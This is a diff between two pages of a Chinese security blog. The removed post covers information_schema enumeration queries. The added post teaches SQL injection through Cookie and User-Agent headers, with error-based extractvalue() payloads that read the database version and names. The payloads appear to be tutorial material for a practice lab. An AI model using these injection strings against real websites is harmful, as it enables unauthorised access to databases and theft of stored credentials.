@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     
     
-    <title>SQL注入之information_schema库 | To be better</title>
+    <title>SQL注入之cookie和user-agent注入 | To be better</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="keywords" content="SQL注入">
@@ -138,7 +138,7 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">
-            <span>SQL注入之information_schema库</span>
+            <span>SQL注入之cookie和user-agent注入</span>
             
         </div>
         
@@ -151,11 +151,11 @@
 <header class="content-header post-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
-        <h1 class="title">SQL注入之information_schema库</h1>
+        <h1 class="title">SQL注入之cookie和user-agent注入</h1>
         <h5 class="subtitle">
             
-                <time datetime="2019-08-15T04:35:29.000Z" itemprop="datePublished" class="page-time">
-  2019-08-15
+                <time datetime="2019-08-17T13:49:16.000Z" itemprop="datePublished" class="page-time">
+  2019-08-17
 </time>
 
 
@@ -184,12 +184,12 @@
 
 
 <div class="container body-wrap">
-    <article id="post-SQL注入之information-schema库"
+    <article id="post-SQL注入之cookie和user-agent注入"
   class="post-article article-type-post" itemprop="blogPost">
     <div class="post-card">
-        <h1 class="post-card-title">SQL注入之information_schema库</h1>
+        <h1 class="post-card-title">SQL注入之cookie和user-agent注入</h1>
         <div class="post-meta">
-            <time class="post-time" title="2019-08-15 12:35:29" datetime="2019-08-15T04:35:29.000Z"  itemprop="datePublished">2019-08-15</time>
+            <time class="post-time" title="2019-08-17 21:49:16" datetime="2019-08-17T13:49:16.000Z"  itemprop="datePublished">2019-08-17</time>
 
             
 	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
@@ -205,25 +205,30 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             
-            <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
-<h1 id="information-schema简介"><a href="#information-schema简介" class="headerlink" title="information_schema简介"></a>information_schema简介</h1><p>每种数据库语言都有着自己第一无二的特性，mysql也不例外。在mysql数据库中,informationschema 是 mysql 自 带 的 元 数 据 库 ， 是 每 个 mysql 实 例 中 的 数 据 库 ， 通 过 它 我 们 能 够 找 到 mysql 数 据 库 中 所 有 的 数 据 信 息。</p>
-<p><strong>注：information_schema是在sql5.0版本之后才有的，5.0之前需要只能暴力去跑。</strong></p>
-<blockquote>
-<h3 id="informaton-schema-是mysql数据库内置自带的元数据库"><a href="#informaton-schema-是mysql数据库内置自带的元数据库" class="headerlink" title="informaton_schema:是mysql数据库内置自带的元数据库"></a>informaton_schema:是mysql数据库内置自带的元数据库</h3></blockquote>
-<h2 id="schemata表"><a href="#schemata表" class="headerlink" title="schemata表"></a>schemata表</h2><p>包含了mysql数据库中所有的数据库信息，相等于我们上述的show databases操作。我们可以通过schemata表来获取mysql中所以数据 库名信息。</p>
-<p>通过sql自带的informaton_schema查询有哪些数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p><code>group_concat是一个字符串连接函数，查询结果通过逗号分离。
--- 是sql注释符(--后面有一个空格)url中+等于空格所以通常用--+来注释后面内容</code></p>
-<h2 id="tables表"><a href="#tables表" class="headerlink" title="tables表"></a>tables表</h2><p>包含了mysql数据库中的所有表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema=<span class="string">'security'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="columns表"><a href="#columns表" class="headerlink" title="columns表"></a>columns表</h2><p>包含了mysql表中所有数据列的信息。详细表述了某张表的所有列以及每个列的信息。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="查询敏感信息"><a href="#查询敏感信息" class="headerlink" title="查询敏感信息"></a>查询敏感信息</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span><span class="comment">--+</span></span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span><span class="comment">--+</span></span><br><span class="line">查询出账号密码。</span><br></pre></td></tr></table></figure>
-
+            <h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="cookie简介"><a href="#cookie简介" class="headerlink" title="cookie简介"></a>cookie简介</h2><p>cookie是一串加密过的数据，是网站为了辨别用户身份而存在在用户本地终端。简单理解。它就是一个用户身份凭证，并保存在本地客户端。</p>
+<p>它的请求原理大概为这个：用户使用浏览器第一次访问网站服务器时，服务器会返回给用户浏览器一段数据，浏览器将其保存到本地，以后用户使用浏览器每次再访问网站服务器时，请求都带着这个cookie数据来标明自己用户的身份。</p>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>cookie注入，简单理解为http协议包中对cookie值进行sql注入。与之前get，post也是相似的，只是注入点位置不一样罢了。</p>
+<h2 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h2><blockquote>
+<p>Cookie: uname=admin’</p>
+</blockquote>
+<h2 id="查询数据库版本信息"><a href="#查询数据库版本信息" class="headerlink" title="查询数据库版本信息"></a>查询数据库版本信息</h2><blockquote>
+<p>Cookie: uname=admin’ and (extractvalue(1,concat(0x7e,(select @@version),0x7e)))#</p>
+</blockquote>
+<p>这里套用extractvalue()函数报错</p>
+<h2 id="查询当前数据库名称"><a href="#查询当前数据库名称" class="headerlink" title="查询当前数据库名称"></a>查询当前数据库名称</h2><blockquote>
+<p>Cookie: uname=admin’ and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#</p>
+</blockquote>
+<p>接下来关于查询表名，字段名和数据，就是中间select子查询部分更换下sql注入语句就好了</p>
+<h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><h2 id="user-agent简介"><a href="#user-agent简介" class="headerlink" title="user-agent简介"></a>user-agent简介</h2><p>user-agen也是http协议请求携带的参数信息。它名为用户代理。主要是用于告知服务器知道客户端一些终端信息。user-gent往往包含着以下客户端内容：使用的浏览器及版本号、操作系统版本等等。</p>
+<h2 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h2><blockquote>
+<p>User-Agent:’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
+</blockquote>
+<h2 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h2><blockquote>
+<p>User-Agent:’and extractvalue(1,concat(0x7e,(select database()),0x7e)) or ‘1’=’1</p>
+</blockquote>
+<h2 id="查询第三个数据库名"><a href="#查询第三个数据库名" class="headerlink" title="查询第三个数据库名"></a>查询第三个数据库名</h2><blockquote>
+<p>User-Agent:’and extractvalue(1,concat(0x7e,(select schemaname from informationschema.schemata limit 3,1),0x7e)) or ‘1’=’1</p>
+</blockquote>
 
         </div>
         
@@ -231,12 +236,12 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-08-15T08:56:32.941Z" itemprop="dateUpdated">2019-08-15 16:56:32</time>
+    Last updated: <time datetime="2019-08-16T14:40:46.100Z" itemprop="dateUpdated">2019-08-16 22:40:46</time>
 </span><br>
 
 
         
-        转载注明出处，原文地址：<a href="/2019/08/15/SQL注入之information-schema库/" target="_blank" rel="external">http://wisejay.top/2019/08/15/SQL注入之information-schema库/</a>
+        转载注明出处，原文地址：<a href="/2019/08/17/SQL注入之cookie和user-agent注入/" target="_blank" rel="external">http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/</a>
         
     </div>
     <footer>
@@ -265,7 +270,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/15/SQL注入之information-schema库/&title=《SQL注入之information_schema库》 — To be better&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — To be better&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -277,7 +282,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/15/SQL注入之information-schema库/&title=《SQL注入之information_schema库》 — To be better&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — To be better&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -300,21 +305,14 @@
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="prev">
-      <a href="/2019/08/16/SQL注入之双查询注入/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">SQL注入之双查询注入</h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
   
     <div class="next">
-      <a href="/2019/08/09/Python-正则表达式应用/" id="post-next" class="post-nav-link">
+      <a href="/2019/08/16/SQL注入之POST注入/" id="post-next" class="post-nav-link">
         <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">Python 正则表达式应用</h4>
+        <h4 class="title">SQL注入之POST注入</h4>
       </a>
     </div>
   
@@ -326,7 +324,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#information-schema简介"><span class="post-toc-number">2.</span> <span class="post-toc-text">information_schema简介</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#informaton-schema-是mysql数据库内置自带的元数据库"><span class="post-toc-number">2.0.1.</span> <span class="post-toc-text">informaton_schema:是mysql数据库内置自带的元数据库</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#schemata表"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">schemata表</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tables表"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">tables表</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#columns表"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">columns表</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询敏感信息"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">查询敏感信息</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#cookie"><span class="post-toc-number">1.</span> <span class="post-toc-text">cookie</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cookie简介"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">cookie简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cookie注入"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">cookie注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注入点测试"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">注入点测试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询数据库版本信息"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">查询数据库版本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询当前数据库名称"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">查询当前数据库名称</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-agent"><span class="post-toc-number">2.</span> <span class="post-toc-text">user-agent</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#user-agent简介"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">user-agent简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询数据库版本"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">查询数据库版本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询当前数据库"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">查询当前数据库</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#查询第三个数据库名"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">查询第三个数据库名</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
@@ -405,7 +403,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/15/SQL注入之information-schema库/&title=《SQL注入之information_schema库》 — To be better&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — To be better&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -417,7 +415,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/15/SQL注入之information-schema库/&title=《SQL注入之information_schema库》 — To be better&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/17/SQL注入之cookie和user-agent注入/&title=《SQL注入之cookie和user-agent注入》 — To be better&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -429,7 +427,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvklEQVR42u3aQW7cMBAEQP//0841gSNv9wy5cYDSyVhLNEsGSG7PfHzE1+eX6/fPv97z9FR7z9PfOnzh4eHhraf+/SSenm3vfJr0E6N9cXh4eHi3eclw+VL+/Zj5yMl8Xljw8PDwfgCvXbKTTWj2V/Dw8PD+F16+ZG+ihGQLwcPDw/u3vHzJzg++mwN6Hnkcy1rw8PDwupQgWqZ/zs9X6nt4eHh466p6W+yflbs2Ie+L2eLh4eFd4OUL7iyWbWOFZPx6nnh4eHgXeGeHvgHLI4kiq8bDw8Nb85IQ9lTykYfCQ0b+H8DDw8MbzWEWOrQL9ObFJc0KRX0PDw8Pb81LCl1tIT8fId8S8jgYDw8P7x4vX3Dbe9qCVj5+0XqFh4eHd433/eSigQ41abUjv/gcDw8P7wKvXYhnz9ZtUuXLKpqu8PDw8C7w2okmEcOmbJYfux83CTw8PLyjvLzUlBTJZtFtvmEkn+Dh4eG9h7cp9rcH3FmBbdgugIeHh3eN1wa1+W/zqW9eUJ2y4OHh4S14s1aAWcNWexzPY4sX88fDw8M7ymsL/LODddtmOgs+/vIUHh4e3gVeMlwe77aTa9utVk1XeHh4eEd5M2R+EE+mkpA2x308PDy8d/I2McGs+WATkbwIc/Hw8PCu8fL2grxha3YgPhBG4OHh4V3gJQfcs01UdftUGUzU53c8PDy8Ee9UE9WmFWAf/g6/K+Dh4eGNeJsD7izePdV09WLmeHh4eEd5n+WVA05tFbMy2B89ZXh4eHhHebOhZ8filnpj28DDw8M7xdtsBnmDaR4NJ8FE0dyAh4eHd42XRA+bcn4eIgyPxU/P4uHh4f0A3uZwnLRhzV5HkVLj4eHhvZ3XRhKz+LVtF3icFR4eHt41XrJ8J01Rs+ihDSmKkfHw8PAu8PIv+W2xarO4H5g0Hh4e3nneL+zX5CnQ9oN/AAAAAElFTkSuQmCC" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACyklEQVR42u3awZLaQAwEUP7/p0lVTkkos92SJ3B4PlFeYub5MKO09HjE1/P39Xrnz/uvd94/Ifnr8+V6nLjw8PDwRku/uvKlJ4u4eubr/eTz+zXj4eHhneYlS8k3+uSltMfP+/Vc3sfDw8P7KO898v0GvTlykteNh4eH9/28pLxOyt9ZsY6Hh4f3DbwkjMgPjHYReehwMGvBw8PD63bgIib4hs8H+3t4eHh4i656flTk2/2wLB6tFg8PD+8EbxPF5u38WVybPCF6ZXh4eHi38lpMu+knYcGmgP7hO3h4eHgHeCfGAvKDJCmX8/GvKKXGw8PDu4nX7qj7AjofC9i8IDw8PLwTvLzYzX9sXzS367n8V3h4eHgHeMmjN9v3Joxoh7fw8PDw/g8vr7Lb5lNbju9bX3UDDA8PD2/ByyOJWcSwOULySPeHmQg8PDy8Y7w8IMjHrfZjB8PmGR4eHt4BXt6Mn7XzZ2FHflwVk2V4eHh4N/HqlPem2YQ85L3tSMDDw8O7lbcZe2qX2P7i5oDBw8PDO81rN/d2u8/bV5uW2F+f8fDw8I7xNsMBm3HSJASZhSZ1WoyHh4e36A21G3c7StWOnyaweugKDw8Pb8Eb/ic/Js3GBTahcFH14+Hh4S14+ZRBEuDmm3u73DxoxsPDwzvHm7W12g09PzxmQcblM/Hw8PAO8PLjoW1WtadT3h7Dw8PD+yxvv6DZAFY7aJXDoqErPDw8vAWvbdvPRqnaJlk77FUkLnh4eHhr3rO89gMHbSsreQVRSY2Hh4d3E6/ddvPvzMazNozNoYKHh4fX8tpyeRO5tkV2W45HP4CHh4d3E28Ws7anTc7YHF2X8xF4eHh4X8PbfCcfPhhGHnh4eHgf5eXZRlJkJ6V8OxB2GUbg4eHhHeDNwohNi2v2nLaFhoeHh3eCt2mAbWLc5LBJSvOD/T08PDy8f+/8AuoM+T4TExbHAAAAAElFTkSuQmCC" alt="微信分享二维码">
 </div>
 
 
